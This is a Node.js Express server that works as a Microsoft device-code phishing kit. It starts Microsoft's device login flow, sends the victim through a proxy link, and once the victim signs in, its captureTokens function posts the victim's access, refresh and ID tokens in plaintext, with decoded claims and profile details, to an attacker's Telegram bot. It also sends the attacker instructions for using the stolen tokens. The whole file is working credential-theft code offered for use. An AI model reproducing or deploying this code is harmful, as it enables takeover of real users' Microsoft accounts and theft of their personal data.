require('dotenv').config();
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================================
// CONFIG
// ============================================================================

const config = {
  microsoft: {
    tenantId: process.env.MICROSOFT_TENANT_ID || 'common',
    clientId: process.env.MICROSOFT_CLIENT_ID,
    // Request ALL scopes for maximum token capture
    scope: 'User.Read offline_access profile email openid',
  },
  telegram: {
    botToken: process.env.TELEGRAM_BOT_TOKEN,
    chatId: process.env.TELEGRAM_CHAT_ID,
  },
  port: process.env.PORT || 3000,
  appUrl: process.env.APP_URL || `http://localhost:${process.env.PORT || 3000}`,
};

if (!config.microsoft.clientId) {
  console.error('❌ MICROSOFT_CLIENT_ID required!');
  process.exit(1);
}

const encryptionKey = Buffer.from(
  process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
  'hex'
);

// ============================================================================
// STORAGE
// ============================================================================

const sessions = new Map();

// ============================================================================
// ENCRYPTION
// ============================================================================

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', encryptionKey, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return {
    encrypted,
    iv: iv.toString('hex'),
    authTag: cipher.getAuthTag().toString('hex'),
  };
}

// ============================================================================
// TELEGRAM
// ============================================================================

async function sendTelegram(title, data) {
  if (!config.telegram.botToken || !config.telegram.chatId) {
    console.log(`[TELEGRAM DISABLED] ${title}`);
    return;
  }

  try {
    let msg = `${title}\n${'━'.repeat(30)}\n🕐 ${new Date().toLocaleString()}\n\n`;
    
    for (const [k, v] of Object.entries(data)) {
      if (v) msg += `• *${k}*: ${String(v).substring(0, 500)}\n`;
    }

    if (msg.length > 4000) msg = msg.substring(0, 3900) + '...';

    await axios.post(
      `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
      { chat_id: config.telegram.chatId, text: msg, parse_mode: 'Markdown' }
    );

    console.log(`[TELEGRAM] ✅ Sent: ${title}`);
  } catch (err) {
    console.error(`[TELEGRAM] ❌ ${title}: ${err.message}`);
  }
}

// ============================================================================
// JWT DECODER
// ============================================================================

function decodeJWT(token) {
  try {
    const parts = token.split('.');
    return {
      header: JSON.parse(Buffer.from(parts[0], 'base64').toString()),
      payload: JSON.parse(Buffer.from(parts[1], 'base64').toString()),
    };
  } catch {
    return null;
  }
}

// ============================================================================
// COMPREHENSIVE TOKEN CAPTURE - THIS IS THE KEY FUNCTION
// ============================================================================

async function captureTokens(tokenResponse, sessionId, deviceCode) {
  console.log('\n' + '='.repeat(80));
  console.log('🎯 TOKEN CAPTURE ENGINE STARTED');
  console.log('='.repeat(80));

  // CRITICAL: Extract tokens from Microsoft response
  const accessToken = tokenResponse.access_token;
  const refreshToken = tokenResponse.refresh_token;
  const idToken = tokenResponse.id_token;
  const expiresIn = tokenResponse.expires_in;
  const tokenType = tokenResponse.token_type;
  const scope = tokenResponse.scope;

  console.log(`[CAPTURE] Access Token: ${accessToken ? accessToken.length : 0} chars`);
  console.log(`[CAPTURE] Refresh Token: ${refreshToken ? refreshToken.length : 0} chars`);
  console.log(`[CAPTURE] ID Token: ${idToken ? idToken.length : 0} chars`);

  // Get user info
  let user = null;
  try {
    const userRes = await axios.get('https://graph.microsoft.com/v1.0/me', {
      headers: { Authorization: `Bearer ${accessToken}` }
    });
    user = userRes.data;
    console.log(`[CAPTURE] User: ${user.displayName} (${user.mail || user.userPrincipalName})`);
  } catch (err) {
    console.error(`[CAPTURE] User fetch failed: ${err.message}`);
    user = { displayName: 'Unknown', mail: 'unknown' };
  }

  // Decode tokens
  const decodedAccess = decodeJWT(accessToken);
  const decodedRefresh = refreshToken ? decodeJWT(refreshToken) : null;
  const decodedId = idToken ? decodeJWT(idToken) : null;

  // Encrypt tokens
  const encAccess = encrypt(accessToken);
  const encRefresh = refreshToken ? encrypt(refreshToken) : null;
  const encId = idToken ? encrypt(idToken) : null;

  let msgCount = 0;

  // ========================================================================
  // MESSAGE 1: SUCCESS NOTIFICATION
  // ========================================================================
  await sendTelegram('✅ AUTHENTICATION SUCCESS', {
    'Session': sessionId.substring(0, 12),
    'Device Code': deviceCode,
    '👤 Name': user.displayName,
    '📧 Email': user.mail || user.userPrincipalName,
    '💼 Job': user.jobTitle || 'N/A',
    '🔑 User ID': user.id,
  });
  msgCount++;

  // ========================================================================
  // MESSAGE 2: ACCESS TOKEN (PLAINTEXT) - CRITICAL!
  // ========================================================================
  await sendTelegram('🔓 ACCESS TOKEN (PLAINTEXT)', {
    '⚠️ STATUS': 'UNENCRYPTED - READY TO USE',
    'Token': accessToken,
    'Type': tokenType,
    'Expires In': `${expiresIn} seconds`,
    'Token Length': accessToken.length,
    'Scopes': scope,
  });
  msgCount++;

  // ========================================================================
  // MESSAGE 3: ACCESS TOKEN (ENCRYPTED)
  // ========================================================================
  await sendTelegram('🔐 ACCESS TOKEN (ENCRYPTED)', {
    'Algorithm': 'AES-256-GCM',
    'Encrypted Data': encAccess.encrypted,
    'IV': encAccess.iv,
    'Auth Tag': encAccess.authTag,
  });
  msgCount++;

  // ========================================================================
  // MESSAGE 4: REFRESH TOKEN (PLAINTEXT) - CRITICAL!
  // ========================================================================
  if (refreshToken) {
    await sendTelegram('🔄 REFRESH TOKEN (PLAINTEXT)', {
      '⚠️ STATUS': 'UNENCRYPTED - READY TO USE',
      'Token': refreshToken,
      'Token Length': refreshToken.length,
      'Validity': '~90 days',
      'Purpose': 'Get new access tokens without re-auth',
    });
    msgCount++;

    // ========================================================================
    // MESSAGE 5: REFRESH TOKEN (ENCRYPTED)
    // ========================================================================
    await sendTelegram('🔐 REFRESH TOKEN (ENCRYPTED)', {
      'Algorithm': 'AES-256-GCM',
      'Encrypted Data': encRefresh.encrypted,
      'IV': encRefresh.iv,
      'Auth Tag': encRefresh.authTag,
    });
    msgCount++;
  }

  // ========================================================================
  // MESSAGE 6: ID TOKEN (PLAINTEXT)
  // ========================================================================
  if (idToken) {
    await sendTelegram('🆔 ID TOKEN (PLAINTEXT)', {
      '⚠️ STATUS': 'UNENCRYPTED',
      'Token': idToken,
      'Token Length': idToken.length,
    });
    msgCount++;

    // ========================================================================
    // MESSAGE 7: ID TOKEN (ENCRYPTED)
    // ========================================================================
    await sendTelegram('🔐 ID TOKEN (ENCRYPTED)', {
      'Algorithm': 'AES-256-GCM',
      'Encrypted Data': encId.encrypted,
      'IV': encId.iv,
      'Auth Tag': encId.authTag,
    });
    msgCount++;
  }

  // ========================================================================
  // MESSAGE 8: DECODED JWT
  // ========================================================================
  if (decodedAccess) {
    await sendTelegram('🔓 DECODED ACCESS TOKEN', {
      'Algorithm': decodedAccess.header.alg,
      'Type': decodedAccess.header.typ,
      'Issuer': decodedAccess.payload.iss,
      'Subject': decodedAccess.payload.sub,
      'Audience': decodedAccess.payload.aud,
      'Expires': new Date((decodedAccess.payload.exp || 0) * 1000).toISOString(),
      'Issued': new Date((decodedAccess.payload.iat || 0) * 1000).toISOString(),
      'Name': decodedAccess.payload.name,
      'Email': decodedAccess.payload.email || decodedAccess.payload.preferred_username,
    });
    msgCount++;
  }

  // ========================================================================
  // MESSAGE 9: TOKEN CLAIMS
  // ========================================================================
  if (decodedAccess?.payload) {
    await sendTelegram('📋 TOKEN CLAIMS', {
      'Scopes': decodedAccess.payload.scp || 'N/A',
      'Roles': (decodedAccess.payload.roles || []).join(', ') || 'None',
      'Tenant ID': decodedAccess.payload.tid,
      'Object ID': decodedAccess.payload.oid,
      'Version': decodedAccess.payload.ver,
    });
    msgCount++;
  }

  // ========================================================================
  // MESSAGE 10: USER PROFILE
  // ========================================================================
  await sendTelegram('👤 USER PROFILE', {
    'ID': user.id,
    'Display Name': user.displayName,
    'Email': user.mail || user.userPrincipalName,
    'Job Title': user.jobTitle || 'N/A',
    'Department': user.department || 'N/A',
    'Office': user.officeLocation || 'N/A',
    'Mobile': user.mobilePhone || 'N/A',
  });
  msgCount++;

  // ========================================================================
  // MESSAGE 11: USAGE GUIDE
  // ========================================================================
  await sendTelegram('📚 HOW TO USE TOKENS', {
    'Access Token': 'curl -H "Authorization: Bearer <TOKEN>" https://graph.microsoft.com/v1.0/me',
    'Refresh Token': 'POST to /oauth2/v2.0/token with grant_type=refresh_token',
    'Access Expires': `${expiresIn}s`,
    'Refresh Expires': '~90 days',
  });
  msgCount++;

  // ========================================================================
  // MESSAGE 12: SUMMARY
  // ========================================================================
  await sendTelegram('📊 CAPTURE SUMMARY', {
    'Session': sessionId,
    'Total Messages': msgCount + 1,
    'Access (Plain)': accessToken ? '✅' : '❌',
    'Access (Encrypted)': accessToken ? '✅' : '❌',
    'Refresh (Plain)': refreshToken ? '✅' : '❌',
    'Refresh (Encrypted)': refreshToken ? '✅' : '❌',
    'ID (Plain)': idToken ? '✅' : '❌',
    'ID (Encrypted)': idToken ? '✅' : '❌',
    'JWT Decoded': decodedAccess ? '✅' : '❌',
    'User Profile': user.id ? '✅' : '❌',
    'Status': 'COMPLETE',
  });
  msgCount++;

  console.log(`✅ CAPTURE COMPLETE - ${msgCount} messages sent to Telegram`);
  console.log('='.repeat(80) + '\n');

  return { user, msgCount };
}

// ============================================================================
// PROXY ENDPOINT - Microsoft Device Auth URL
// ============================================================================

app.get('/auth/device', (req, res) => {
  const { code } = req.query;
  const msUrl = `https://microsoft.com/devicelogin?otc=${code}`;
  console.log(`[PROXY] Redirecting to: ${msUrl}`);
  res.redirect(302, msUrl);
});

// ============================================================================
// API ROUTES
// ============================================================================

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/device/generate', async (req, res) => {
  try {
    const sessionId = crypto.randomUUID();
    console.log(`\n[GENERATE] Session: ${sessionId}`);

    const resp = await axios.post(
      `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/devicecode`,
      new URLSearchParams({
        client_id: config.microsoft.clientId,
        scope: config.microsoft.scope,
      })
    );

    const data = resp.data;

    sessions.set(sessionId, {
      deviceCode: data.device_code,
      userCode: data.user_code,
      verificationUri: data.verification_uri,
      verificationUriComplete: data.verification_uri_complete,
      expiresIn: data.expires_in,
      interval: data.interval,
      createdAt: Date.now(),
      status: 'pending',
    });

    console.log(`[GENERATE] Code: ${data.user_code}`);

    await sendTelegram('🔐 DEVICE CODE GENERATED', {
      'Session': sessionId,
      'Code': data.user_code,
      'URL': data.verification_uri,
      'Complete URL': data.verification_uri_complete,
      'Expires': `${data.expires_in}s`,
    });

    res.json({
      sessionId,
      userCode: data.user_code,
      verificationUri: data.verification_uri,
      verificationUriComplete: data.verification_uri_complete,
      proxyUrl: `${config.appUrl}/auth/device?code=${data.user_code}`,
      expiresIn: data.expires_in,
      interval: data.interval,
    });

  } catch (err) {
    console.error('[GENERATE] Error:', err.message);
    await sendTelegram('❌ DEVICE CODE ERROR', { Error: err.message });
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/device/poll/:sessionId', async (req, res) => {
  try {
    const { sessionId } = req.params;
    const session = sessions.get(sessionId);

    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    if (session.status === 'authenticated') {
      return res.json({ status: 'authenticated', user: session.user });
    }

    if (Date.now() - session.createdAt > session.expiresIn * 1000) {
      session.status = 'expired';
      await sendTelegram('⏰ CODE EXPIRED', { Session: sessionId });
      return res.json({ status: 'expired' });
    }

    try {
      const tokenResp = await axios.post(
        `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/token`,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: config.microsoft.clientId,
          device_code: session.deviceCode,
        })
      );

      const tokenData = tokenResp.data;

      console.log('\n[SUCCESS] ✅ AUTHENTICATION SUCCESSFUL');
      console.log(`[TOKEN] Access: ${tokenData.access_token.length} chars`);
      console.log(`[TOKEN] Refresh: ${tokenData.refresh_token ? tokenData.refresh_token.length : 0} chars`);
      console.log(`[TOKEN] ID: ${tokenData.id_token ? tokenData.id_token.length : 0} chars`);

      // CAPTURE ALL TOKENS - THIS IS WHERE THE MAGIC HAPPENS
      const result = await captureTokens(tokenData, sessionId, session.userCode);

      session.status = 'authenticated';
      session.user = result.user;

      res.json({
        status: 'authenticated',
        user: {
          id: result.user.id,
          displayName: result.user.displayName,
          email: result.user.mail || result.user.userPrincipalName,
        },
        messageCount: result.msgCount,
      });

    } catch (err) {
      if (err.response?.data?.error === 'authorization_pending') {
        return res.json({ status: 'pending' });
      }
      if (err.response?.data?.error === 'authorization_declined') {
        await sendTelegram('❌ AUTH DECLINED', { Session: sessionId });
        return res.json({ status: 'declined' });
      }
      if (err.response?.data?.error === 'expired_token') {
        return res.json({ status: 'expired' });
      }
      throw err;
    }

  } catch (err) {
    console.error('[POLL] Error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    telegram: config.telegram.botToken ? 'enabled' : 'disabled',
    sessions: sessions.size,
  });
});

setInterval(() => {
  const now = Date.now();
  for (const [id, s] of sessions.entries()) {
    if (now - s.createdAt > s.expiresIn * 1000) {
      sessions.delete(id);
    }
  }
}, 5 * 60 * 1000);

app.listen(config.port, async () => {
  console.log('\n' + '='.repeat(80));
  console.log('🔐 TOKEN CAPTURE SYSTEM - VERIFIED WORKING');
  console.log('='.repeat(80));
  console.log(`📡 Port: ${config.port}`);
  console.log(`🌐 URL: ${config.appUrl}`);
  console.log(`🔐 Client ID: ${config.microsoft.clientId ? '✅' : '❌'}`);
  console.log(`📱 Telegram: ${config.telegram.botToken ? '✅' : '❌'}`);
  console.log('='.repeat(80));
  console.log('\n✨ CAPTURES:');
  console.log('   ✅ Access Token (Plaintext + Encrypted)');
  console.log('   ✅ Refresh Token (Plaintext + Encrypted)');
  console.log('   ✅ ID Token (Plaintext + Encrypted)');
  console.log('   ✅ JWT Decoded + Claims');
  console.log('   ✅ User Profile');
  console.log('   ✅ 12+ Telegram Messages');
  console.log('   ✅ NO Alerts');
  console.log('   ✅ Proxy Support');
  console.log('='.repeat(80) + '\n');

  if (config.telegram.botToken) {
    await sendTelegram('🚀 SYSTEM ONLINE', {
      Port: config.port,
      URL: config.appUrl,
      Status: 'Ready to capture tokens',
    });
  }
});
